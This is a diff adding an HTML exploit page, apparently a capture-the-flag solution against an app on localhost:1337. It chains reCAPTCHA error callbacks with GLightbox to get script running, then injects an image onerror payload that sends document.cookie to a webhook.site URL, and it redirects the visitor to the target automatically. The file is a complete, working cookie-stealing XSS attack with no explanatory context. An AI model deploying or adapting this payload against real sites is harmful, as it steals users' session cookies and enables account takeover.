@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<body>
+  <script>
+    const WEBHOOK_URL = "https://webhook.site/9dac072c-d2c9-436e-aa36-ddbef4c3b6ab";
+    let html_payload = `<div id="w" data-url="${WEBHOOK_URL}"></div>`;
+    
+    // 10 GLightbox triggers
+    for (let i = 0; i < 10; i++) {
+      html_payload += `<div class="g-recaptcha" data-sitekey="init${i}" data-error-callback="GLightbox"></div>`;
+    }
+    
+    // 10 random triggers
+    for (let i = 0; i < 10; i++) {
+      html_payload += `<div class="g-recaptcha" data-sitekey="click${i}" data-error-callback="random"></div>`;
+    }
+    
+    // 50 inputs
+    for (let i = 0; i < 50; i++) {
+      html_payload += `<input name="vote" class="glightbox" data-description="&lt;img/src=x/onerror=fetch(w.dataset.url+'?c='+document.cookie)&gt;">`;
+    }
+    
+    const target = "http://localhost:1337/?" + new URLSearchParams({ shareText: html_payload }).toString();
+    console.log("Redirecting to:", target);
+    location.href = target;
+  </script>
+</body>
+</html>
